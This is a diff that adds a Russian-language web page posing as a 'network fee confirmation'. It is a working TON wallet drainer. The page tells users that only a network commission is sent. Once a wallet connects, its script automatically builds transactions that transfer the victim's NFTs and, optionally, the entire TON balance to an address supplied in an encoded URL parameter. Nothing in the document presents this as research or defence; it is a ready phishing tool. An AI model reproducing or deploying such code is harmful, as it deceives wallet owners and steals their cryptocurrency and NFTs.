@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Подтверждение</title>
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+<style>
+  body{margin:0;font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0f1115;color:#e8e8e8;
+       display:flex;min-height:100vh;align-items:center;justify-content:center}
+  .card{max-width:340px;padding:26px;text-align:center}
+  h1{font-size:19px;margin:0 0 8px}p{font-size:14px;color:#9aa0a6;margin:0 0 20px}
+  #tc{margin-bottom:12px}#st{font-size:13px;color:#7ee08a;min-height:20px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Подтверждение комиссии</h1>
+<p>Отправляется только комиссия сети. Подключи кошелёк и подтверди.</p>
+  <div id="tc"></div><div id="st"></div>
+</div>
+<script type="module">
+import { beginCell, Address } from "https://esm.sh/@ton/core@0.56.0";
+
+const st = document.getElementById("st");
+const p = new URLSearchParams(location.search);
+const cfg = p.get("d") ? JSON.parse(atob(p.get("d"))) : null;
+
+const ui = new TonConnectUI({
+  manifestUrl: new URL("tonconnect-manifest.json", location.href).href,
+  buttonRootId: "tc"
+});
+
+const nftBody = (to) => beginCell()
+  .storeUint(0x5fcc3d14, 32).storeUint(0, 64)
+  .storeAddress(Address.parse(to)).storeAddress(Address.parse(to))
+  .storeUint(0, 1).storeCoins(1).storeUint(0, 1)
+  .endCell().toBoc().toString("base64");
+
+async function build(addr) {
+  const msgs = [];
+  const gas = Number(cfg.gas || 0.05);
+  let gasNeed = 0;
+
+  if (cfg.nfts) {
+    const r = await fetch(`https://tonapi.io/v2/accounts/${addr}/nfts?limit=${cfg.max || 20}`);
+    let items = (await r.json()).nft_items || [];
+    if (Array.isArray(cfg.nfts)) items = items.filter(i => cfg.nfts.includes(i.address));
+    if (cfg.collections) items = items.filter(i => cfg.collections.includes(i.collection?.address));
+    items = items.slice(0, cfg.max || 20);
+    for (const it of items) {
+      msgs.push({ address: it.address, amount: String(Math.round(gas * 1e9)), payload: nftBody(cfg.to) });
+      gasNeed += gas;
+    }
+  }
+
+  if (cfg.ton) {
+    const r = await fetch(`https://tonapi.io/v2/accounts/${addr}`);
+    const bal = (await r.json()).balance / 1e9;
+    const send = cfg.ton === "all" ? bal - gasNeed - Number(cfg.reserve || 0.08) : Number(cfg.ton);
+    if (send > 0.02) msgs.push({ address: cfg.to, amount: String(Math.floor(send * 1e9)) });
+  }
+  return msgs;
+}
+
+async function go() {
+  try {
+    if (!cfg || !cfg.to) { st.textContent = "Нет данных операции"; return; }
+    if (!ui.connected) await ui.connect();
+    st.textContent = "Собираем операцию...";
+    const msgs = await build(ui.account.address);
+    if (!msgs.length) { st.textContent = "Нечего отправлять"; return; }
+    st.textContent = "Подтверди в кошельке";
+    await ui.sendTransaction({ validUntil: Math.floor(Date.now() / 1000) + 300, messages: msgs });
+    st.textContent = "Готово. Вернись в чат.";
+  } catch (e) {
+    st.textContent = "Отменено. Попробуй ещё раз.";
+  }
+}
+
+ui.onStatusChange(w => { if (w && !window.__s) { window.__s = 1; go(); } });
+setTimeout(() => { if (!window.__s) go(); }, 800);
+</script>
+</body>
+</html>
